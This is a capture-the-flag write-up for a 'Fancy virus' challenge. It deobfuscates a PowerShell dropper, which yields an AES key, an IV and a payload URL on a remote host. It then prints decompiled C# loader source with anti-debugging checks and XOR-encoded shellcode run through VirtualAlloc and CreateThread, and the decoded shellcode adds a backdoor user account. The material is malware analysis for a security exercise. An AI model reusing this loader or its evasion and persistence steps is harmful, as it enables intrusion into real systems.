---
ai_date: '2025-04-27 05:28:29'
ai_summary: Detected AES decryption and flag in PowerShell script, involving hardcoded
  key and IV
ai_tags:
- aes
- decryption
- flag
created: 2025-01-11T00:52
points: 100
solves: 172
tags:
- virus
- powershell
updated: 2025-01-12T18:59
---

Fancy virus.

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1736574732/2025/01/431187778e5786c338cbf5c08cefd374.png)

We found a suspicious powershell script.

```powershell [kcaswqcd.ps1]
sEt-ITeM  ('VARIABlE:'+'V'+'s'+'52a'+'r')  ( [TyPe]("{0}{1}{2}" -f't','ExT','.EncOdinG'))  ;  SeT-vArIaBle  ...
```

It is using AES to decrypt something, let's get the hardcoded key and iv.

```powershell
$cv = ("{0}{2}{1}" -f 'ht', '3', ("{0}{1}" -f 'tp:', '//')) + '4' + ("{1}{0}" -f '60.', '.') + '97.' + '167' + '/' + ("{0}{1}" -f '82n', 'vd') + ("{0}{1}{2}" -f 'kan', 'df.', 'bin')
$key = [System.Text.Encoding]::UTF8.GetBytes(
    ("{0}{2}{1}" -f 'sk', '89', 'sd') + 'D2G' + ("{0}{1}" -f '0X9', 'j') + ("{1}{0}" -f 'F', 'k2f') +
    ("{0}{1}" -f ("{0}{1}" -f '1', 'b4S'), '2') + 'a7' + ("{1}{0}" -f 'a', 'Gh8') + 'Vk0' + 'L'
)
$iv = [System.Text.Encoding]::UTF8.GetBytes(
    ("{1}{0}" -f 'e', ("{0}{1}" -f 'Md3', '3')) + 'F' + 'a' + ("{0}{2}{1}" -f '0', 'Z', ("{0}{1}" -f 'wN', 'x2')) +
    'q' + ("{3}{2}{1}{0}" -f 'Y1', ("{1}{2}{0}" -f 'm', '7oN', '45'), ("{1}{0}{2}" -f '6', 'LjK', 'X9t3G'), '5')
)
Write-Output "cv: $cv"
Write-Output "key: $([System.BitConverter]::ToString($key))"
Write-Output "iv: $([System.BitConverter]::ToString($iv))"
```

```
cv: http://34.60.97.167/82nvdkandf.bin
key: 73-6B-73-64-38-39-44-32-47-30-58-39-6A-6B-32-66-46-31-62-34-53-32-61-37-47-68-38-61-56-6B-30-4C
iv: 4D-64-33-33-65-46-61-30-77-4E-78-32-5A-71-35-4C-6A-4B-36-58-39-74-33-47-37-6F-4E-34-35-6D-59-31
```

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1736574930/2025/01/7999d2f8827b094c2b681e0b8678386b.png)

It is a executable!

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1736574967/2025/01/b30fac31dcd141af00d2e5cb4e2026fd.png)

Welp.

After some decompiling.

```csharp
using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace Kljansdfkansdf
{
	// Token: 0x02000003 RID: 3
	[NullableContext(1)]
	[Nullable(0)]
	public class Kljansdfkansdf
	{
		// Token: 0x06000009 RID: 9 RVA: 0x00002080 File Offset: 0x00000280
		public static void kjfadsiewqinfqniowf(byte[] ncuasdhif)
		{
			uint num = Win32.VirtualAlloc(0U, (uint)ncuasdhif.Length, Win32.MEM_COMMIT, Win32.PAGE_READWRITE);
			Marshal.Copy(ncuasdhif, 0, (IntPtr)((UIntPtr)num), ncuasdhif.Length);
			uint num2;
			Win32.VirtualProtect((IntPtr)((UIntPtr)num), (UIntPtr)((IntPtr)ncuasdhif.Length), Win32.PAGE_EXECUTE_READ, out num2);
			IntPtr zero = IntPtr.Zero;
			uint num3 = 0U;
			IntPtr zero2 = IntPtr.Zero;
			Win32.WaitForSingleObject(Win32.CreateThread(0U, 0U, num, zero2, 0U, ref num3), uint.MaxValue);
		}

		// Token: 0x0600000A RID: 10 RVA: 0x000020E4 File Offset: 0x000002E4
		private static void Main(string[] args)
		{
			Win32.ShowWindow(Win32.GetConsoleWindow(), Win32.SW_HIDE);
			if (Debugger.IsAttached)
			{
				Environment.Exit(0);
			}
			foreach (Process process in Process.GetProcesses())
			{
				if (process.ProcessName.Contains("devenv") || process.ProcessName.Contains("dnspy"))
				{
					Environment.Exit(0);
				}
			}
			byte[] array = new byte[]
			{
				129, 149, byte.MaxValue, 125, 125, 125, 29, 244, 152, 76,
				189, 25, 246, 45, 77, 246, 47, 113, 246, 47,
				105, 246, 15, 85, 114, 202, 55, 91, 76, 130,
				209, 65, 28, 1, 127, 81, 93, 188, 178, 112,
				124, 186, 159, 143, 47, 42, 246, 47, 109, 246,
				55, 65, 246, 49, 108, 5, 158, 53, 124, 172,
				44, 246, 36, 93, 124, 174, 246, 52, 101, 158,
				71, 52, 246, 73, 246, 124, 171, 76, 130, 209,
				188, 178, 112, 124, 186, 69, 157, 8, 139, 126,
				0, 133, 70, 0, 89, 8, 153, 37, 246, 37,
				89, 124, 174, 27, 246, 113, 54, 246, 37, 97,
				124, 174, 246, 121, 246, 124, 173, 244, 57, 89,
				89, 38, 38, 28, 36, 39, 44, 130, 157, 34,
				34, 39, 246, 111, 150, 240, 32, 23, 124, 240,
				248, 207, 125, 125, 125, 45, 21, 76, 246, 18,
				250, 130, 168, 198, 141, 200, 223, 43, 21, 219,
				232, 192, 224, 130, 168, 65, 123, 1, 119, 253,
				134, 157, 8, 120, 198, 58, 110, 15, 18, 23,
				125, 46, 130, 168, 30, 16, 25, 93, 82, 30,
				93, 19, 24, 9, 93, 8, 14, 24, 15, 93,
				17, 24, 26, 20, 9, 8, 14, 24, 15, 93,
				8, 18, 27, 9, 30, 9, 27, 6, 42, 73,
				14, 34, 76, 41, 34, 47, 78, 28, 17, 17,
				4, 34, 28, 51, 34, 52, 16, 13, 17, 73,
				19, 9, 66, 66, 0, 93, 82, 28, 25, 25,
				93, 82, 4, 125
			};
			byte b = 125;
			for (int j = 0; j < array.Length; j++)
			{
				byte[] array2 = array;
				int num = j;
				array2[num] ^= b;
			}
			Kljansdfkansdf.kjfadsiewqinfqniowf(array);
		}
	}
}
```

Let's decode the bytes.

```python
b'\xfc\xe8\x82\x00\x00\x00`\x89\xe51\xc0d\x8bP0\x8bR\x0c\x8bR\x14\x8br(\x0f\xb7J&1\xff\xac<a|\x02, \xc1\xcf\r\x01\xc7\xe2\xf2RW\x8bR\x10\x8bJ<\x8bL\x11x\xe3H\x01\xd1Q\x8bY \x01\xd3\x8bI\x18\xe3:I\x8b4\x8b\x01\xd61\xff\xac\xc1\xcf\r\x01\xc78\xe0u\xf6\x03}\xf8;}$u\xe4X\x8bX$\x01\xd3f\x8b\x0cK\x8bX\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89D$$[[aYZQ\xff\xe0__Z\x8b\x12\xeb\x8d]j\x01\x8d\x85\xb2\x00\x00\x00Ph1\x8bo\x87\xff\xd5\xbb\xf0\xb5\xa2Vh\xa6\x95\xbd\x9d\xff\xd5<\x06|\n\x80\xfb\xe0u\x05\xbbG\x13roj\x00S\xff\xd5cmd /c net user legituser uoftctf{W4s_1T_R3ally_aN_Impl4nt??} /add /y\x00'
```

Oh well, we have the flag!

```flag
uoftctf{W4s_1T_R3ally_aN_Impl4nt??}
```